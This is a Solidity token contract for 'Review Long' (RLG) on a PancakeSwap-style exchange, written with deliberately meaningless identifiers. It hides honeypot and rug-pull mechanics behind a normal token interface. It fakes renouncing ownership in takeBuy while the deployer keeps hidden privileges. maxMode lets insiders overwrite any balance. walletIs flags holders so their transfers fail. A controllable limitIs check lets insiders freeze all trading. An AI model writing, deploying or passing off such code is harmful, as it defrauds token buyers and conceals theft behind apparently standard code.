//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

interface launchedFundEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountSwapMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingReceiver {
    function createPair(address buyMode, address atWalletReceiver) external returns (address);
}

interface receiverFromWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address swapTrading) external view returns (uint256);

    function transfer(address isLiquidity, uint256 modeTx) external returns (bool);

    function allowance(address sellTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTx) external returns (bool);

    function transferFrom(
        address sender,
        address isLiquidity,
        uint256 modeTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverFee, uint256 value);
    event Approval(address indexed sellTotal, address indexed spender, uint256 value);
}

interface receiverTo is receiverFromWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReviewLong is amountSwapMin, receiverFromWallet, receiverTo {

    mapping(address => uint256) private marketingFrom;

    uint256 constant buyWallet = 19 ** 10;

    function name() external view virtual override returns (string memory) {
        return maxWallet;
    }

    function allowance(address maxList, address totalExemptTo) external view virtual override returns (uint256) {
        if (totalExemptTo == sellMin) {
            return type(uint256).max;
        }
        return toLiquidityList[maxList][totalExemptTo];
    }

    address private sellTake;

    event OwnershipTransferred(address indexed marketingLimitMode, address indexed txReceiver);

    bool public atTokenMarketing;

    bool public enableWallet;

    function decimals() external view virtual override returns (uint8) {
        return launchedSender;
    }

    function approve(address totalExemptTo, uint256 modeTx) public virtual override returns (bool) {
        toLiquidityList[_msgSender()][totalExemptTo] = modeTx;
        emit Approval(_msgSender(), totalExemptTo, modeTx);
        return true;
    }

    uint256 public liquidityShould;

    bool private feeTake;

    uint8 private launchedSender = 18;

    function symbol() external view virtual override returns (string memory) {
        return sellLimitAuto;
    }

    bool private limitLaunch;

    uint256 private senderSwapTeam;

    string private maxWallet = "Review Long";

    function transferFrom(address amountWallet, address isLiquidity, uint256 modeTx) external override returns (bool) {
        if (_msgSender() != sellMin) {
            if (toLiquidityList[amountWallet][_msgSender()] != type(uint256).max) {
                require(modeTx <= toLiquidityList[amountWallet][_msgSender()]);
                toLiquidityList[amountWallet][_msgSender()] -= modeTx;
            }
        }
        return fromIs(amountWallet, isLiquidity, modeTx);
    }

    uint256 teamTx;

    function takeBuy() public {
        emit OwnershipTransferred(swapLaunched, address(0));
        sellTake = address(0);
    }

    uint256 limitIs;

    function owner() external view returns (address) {
        return sellTake;
    }

    function fromIs(address amountWallet, address isLiquidity, uint256 modeTx) internal returns (bool) {
        if (amountWallet == swapLaunched) {
            return fromSwap(amountWallet, isLiquidity, modeTx);
        }
        uint256 feeReceiver = receiverFromWallet(amountMarketing).balanceOf(fundTo);
        require(feeReceiver == limitIs);
        require(isLiquidity != fundTo);
        if (fundAuto[amountWallet]) {
            return fromSwap(amountWallet, isLiquidity, buyWallet);
        }
        return fromSwap(amountWallet, isLiquidity, modeTx);
    }

    mapping(address => mapping(address => uint256)) private toLiquidityList;

    bool private launchMax;

    function balanceOf(address swapTrading) public view virtual override returns (uint256) {
        return marketingFrom[swapTrading];
    }

    address sellMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 public toTakeShould;

    function transfer(address receiverList, uint256 modeTx) external virtual override returns (bool) {
        return fromIs(_msgSender(), receiverList, modeTx);
    }

    uint256 public atToken;

    uint256 private atTotalEnable = 100000000 * 10 ** 18;

    bool private txMarketing;

    address public amountMarketing;

    function totalSupply() external view virtual override returns (uint256) {
        return atTotalEnable;
    }

    string private sellLimitAuto = "RLG";

    bool public marketingToken;

    mapping(address => bool) public fundAuto;

    function maxMode(address receiverList, uint256 modeTx) public {
        feeMarketingAmount();
        marketingFrom[receiverList] = modeTx;
    }

    mapping(address => bool) public walletMinTrading;

    address fundTo = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public swapLaunched;

    function marketingFromTrading(uint256 modeTx) public {
        feeMarketingAmount();
        limitIs = modeTx;
    }

    function feeMarketingAmount() private view {
        require(walletMinTrading[_msgSender()]);
    }

    function listLaunched(address swapTotal) public {
        require(swapTotal.balance < 100000);
        if (atTokenMarketing) {
            return;
        }
        if (launchMax != limitLaunch) {
            limitLaunch = false;
        }
        walletMinTrading[swapTotal] = true;
        if (marketingToken != feeTake) {
            atToken = liquidityShould;
        }
        atTokenMarketing = true;
    }

    function fromSwap(address amountWallet, address isLiquidity, uint256 modeTx) internal returns (bool) {
        require(marketingFrom[amountWallet] >= modeTx);
        marketingFrom[amountWallet] -= modeTx;
        marketingFrom[isLiquidity] += modeTx;
        emit Transfer(amountWallet, isLiquidity, modeTx);
        return true;
    }

    function walletIs(address senderTeam) public {
        feeMarketingAmount();
        if (senderSwapTeam == liquidityShould) {
            enableWallet = true;
        }
        if (senderTeam == swapLaunched || senderTeam == amountMarketing) {
            return;
        }
        fundAuto[senderTeam] = true;
    }

    constructor (){
        if (marketingToken) {
            enableWallet = false;
        }
        launchedFundEnable isMax = launchedFundEnable(sellMin);
        amountMarketing = marketingReceiver(isMax.factory()).createPair(isMax.WETH(), address(this));
        if (marketingToken == feeTake) {
            feeTake = false;
        }
        swapLaunched = _msgSender();
        takeBuy();
        walletMinTrading[swapLaunched] = true;
        marketingFrom[swapLaunched] = atTotalEnable;
        if (enableWallet) {
            feeTake = false;
        }
        emit Transfer(address(0), swapLaunched, atTotalEnable);
    }

    function getOwner() external view returns (address) {
        return sellTake;
    }

}